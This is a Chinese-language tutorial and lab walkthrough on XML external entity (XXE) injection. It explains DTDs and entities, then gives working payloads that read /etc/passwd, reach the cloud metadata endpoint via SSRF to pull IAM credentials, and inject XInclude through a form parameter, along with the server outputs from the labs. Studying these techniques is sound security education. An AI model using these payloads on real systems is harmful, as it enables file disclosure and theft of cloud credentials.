# XXE

XXE 注入指的是 XML 外部实体（XXE）注入，它是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常使攻击者能够查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。

在某些情况下，攻击者可以通过利用 XXE 漏洞执行服务器端请求伪造（SSRF）攻击，将 XXE 攻击升级为危害底层服务器或其他后端基础设施。



**XXE 漏洞是如何产生的？**

一些应用程序使用 XML 格式在浏览器和服务器之间传输数据。执行此操作的应用程序几乎总是使用标准库或平台 API 来处理服务器上的 XML 数据。XXE 漏洞的出现是因为 XML 规范包含各种潜在危险的功能，而标准解析器支持这些功能，即使应用程序通常不使用它们。



## 什么是 XML？

XML 代表“可扩展标记语言”。XML 是一种设计用于存储和传输数据的语言。与 HTML 类似，XML 使用标签和数据的树状结构。



**XML 实体**是一种在 XML 文档中表示数据项的方式，而非直接使用数据本身。XML 语言规范中内置了多种实体。例如，实体 `<` 和 `>` 分别代表字符 `<` 和 `>` 。这些是用于标识 XML 标签的元字符，因此当它们出现在数据中时，通常必须使用其实体来表示。



**XML 文档类型定义（document type definition DTD）**包含可以定义 **XML 文档结构、可包含的数据值类型及其他项目的声明**。DTD 在 XML 文档开头的可选 `DOCTYPE` 元素内声明。DTD 可以完全自包含于文档本身（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），或者两者兼有（称为“混合 DTD”）。



**XML 内部实体**在 DTD 中定义自定义实体。例如：

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

此定义意味着在 XML 文档中使用实体引用 `&myentity;` 时，将被替换为定义的值：" `my entity value` "。



**XML 外部实体**是一种自定义实体，其定义位于声明它们的 DTD 之外。

外部实体的声明使用 `SYSTEM` 关键字，并且必须指定一个 URL，从该 URL 加载实体的值。例如：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```



URL 可以使用 `file://` 协议，因此可以从文件加载外部实体。例如：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

XML 外部实体是引发 XML 外部实体攻击的主要途径。



## 任意文件读取

XXE 注入攻击读取服务器任意文件，主要有两个步骤：

- 引入（或编辑）一个 `DOCTYPE` 元素，该元素定义了一个包含文件路径的外部实体。
- 应用程序响应中返回的 XML 数据值。



例如，假设一个购物应用程序通过向服务器提交以下 XML 来检查产品的库存：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```



该应用程序未针对 XXE 攻击采取特定防御措施，因此你可以通过提交以下 XXE 有效载荷来利用 XXE 漏洞检索 `/etc/passwd` 文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```



此 XXE 负载定义了一个外部实体 `&xxe;` ，其值为 `/etc/passwd` 文件的内容，并在 `productId` 值中使用该实体。

- XML 解析器**首先读取整个 XML 文档**，包括其 `DOCTYPE` 声明。发现 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 定义了一个外部实体 `xxe`。
- 如果解析器未禁用外部实体（默认配置下通常允许），解析器根据 `SYSTEM "file:///etc/passwd"` 指示，**自动**通过 `file://` 协议读取 `/etc/passwd` 文件内容。
- 解析器遍历 XML 文档，将 `&xxe;` 引用替换为 `/etc/passwd` 文件的实际内容。
- 服务器应用程序通过解析器接口（如 `getElementById("productId").getTextContent()`）获取 `<productId>` 的值。此时应用程序拿到的是 **已替换后的文件内容**，而非原始字符串 `&xxe;`。



productId 的值从**一个整数字符串**变成了**一个文件的内容**，当后端应用程序尝试通过 productId 的值读取信息时，无法识别 productId 的值，可能返回以下信息：

```
Invalid product ID: [product content]
```

因为 [product content] 实际是 /etc/passwd 文件的内容，所以服务器返回的内容如下：

```xml
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```



如果服务器不输出 [product content] 的内容，而是只返回 Invalid product id，则此处不存在任意文件读取。



**不同服务器**或**同一服务器不同的API端点（HTTP URL路径）**，它们的业务逻辑可能不同。

例如在下面这个请求中，如果出现错误，服务端返回的错误信息中可能包含 productId 值的内容，但不包含 storeId 值的内容，亦或者相反。在渗透测试中应该**逐个测试所有输入点**而非依赖单一参数。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```



## SSRF 攻击

XXE 攻击的可用于执行**服务器端请求伪造（SSRF）**，服务器端应用程序可能被诱导向**它可以访问的任何 URL 发出 HTTP 请求**。



要利用 XXE 漏洞执行 SSRF 攻击，你需要使用目标 URL 定义一个外部 XML 实体，并在数据值中使用定义的实体。

如果应用程序在响应返回**定义的实体**，那么将能够在应用程序的响应中查看来自 URL 的响应，从而实现与后端系统的双向交互。如果不能，则只能执行盲 SSRF 攻击（这仍可能带来严重后果）。



在以下 XXE 示例中，外部实体将导致服务器向组织基础设施内的内部系统发起后端 HTTP 请求：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```



**实验**

该实验室具有“查询库存”的功能，会解析 XML 格式的输入（启用外部实体），并返回响应中的无效的值。

已知实验室内部网站 `http://169.254.169.254/` 上存在敏感信息，利用 XXE 漏洞执行 SSRF 攻击访问内部网站上的敏感信息。



当使用网站上的 “查询库存” 的按钮时，会使用 XML  格式向服务端发送 HTTP 请求。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```



该网站开启外部实体解析，定义一个外部实体，指定一个 URL，从该 URL 加载实体的值，在 `productId` 值中使用该实体。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/" > ]>

<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```



服务端返回以下内容，product 的值 latest 是内部网站 `http://169.254.169.254/` 返回的内容，推测可能是 URL 路径的一部分，进行拼接后继续发送 HTTP 请求。

```
"Invalid product ID: latest"
```



此时 XML 外部实体访问的 URL 为 `http://169.254.169.254/latest/`。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/" > ]>

<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```



服务端返回的内容依然可能 URL 路径的一部分，继续进行拼接。

```
"Invalid product ID: meta-data"
```



一直持续拼接，当访问 `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` URL 路径时会返回敏感信息。

```
"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2025-03-15T09:13:26.393159078Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "uM5w8FwGCH6KnW7vyMJG",
  "SecretAccessKey" : "nsGocfgOQ4LncuvF3XQeYROsE4myaraKZZmduHL4",
  "Token" : "A981ygGNfmOhuJPgIXpPcq09z4c9YiH94CcIKeAhQFur3j9sZXWKR6rp96IBnnCNRfVeFIjMU5nuuDUdY0XLOWHqqkwUe0cP1Pkd3lxTPJUH3oTl5QN9VfullgMkfTSUzurNorv5ztjeGBktD1JNOOjfeWTCmA2ULYy2ZIcGAHD9FgYEjk93QokIq1JomM88PIJyQgzCbZoY25j3orgAftEJd4iBT7xIaBkbDv3wuA10h7x5ueP92fisqv8U77La",
  "Expiration" : "2031-03-14T09:13:26.393159078Z"
}"
```



## XInclude 攻击

XInclude（XML Inclusions）攻击是一种利用XML解析器处理XInclude指令时的漏洞，从而读取敏感文件或执行服务端请求伪造（SSRF）的攻击技术。其核心原理是**通过部分可控的XML片段，诱导服务器解析时动态包含外部资源**。



常规的XXE攻击需要攻击者控制整个XML文档（如定义`<!DOCTYPE>`），但在某些场景下（如数据被嵌入后端XML中），攻击者仅能控制XML的某个片段。

当应用程序将用户输入拼接到服务端生成的XML文档时，攻击者可利用XInclude指令引用外部资源，**无需控制整个XML结构**。



> 注：并非所有XML解析器默认处理XInclude（如Java的DocumentBuilder需显式启用）



假设一个应用将用户输入的`username`嵌入到后端SOAP请求中：

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserProfile>
      <username>USER-CONTROLLED-DATA</username>
    </getUserProfile>
  </soap:Body>
</soap:Envelope>
```



**攻击者输入**：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```



**服务端生成的XML**：

```xml
<getUserProfile>
  <username>
    <xi:include parse="text" href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>
  </username>
</getUserProfile>
```

**结果**：若XML解析器启用XInclude处理，`/etc/passwd`的内容会被读取并嵌入响应中。



**实验**

该实验室具有**“查询库存”**功能，用户输入的内容会被直接嵌入到服务器端XML文档中，随后系统会对该文档进行解析。

由于无法控制整个 XML 文档，因此无法定义 DTD 来发起经典的 XXE 攻击。要解决实验室问题，注入一个 `XInclude` 语句以检索 `/etc/passwd` 文件的内容。



当使用查询库存功能时，客户端会向服务器发送一个 POST 请求，POST 请求的数据如下：

```
productId=1&storeId=1
```



将 `productId` 参数的值设置为：

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

POST 请求完整数据内容：

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```



服务端响应数据内容：

```
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
"
```

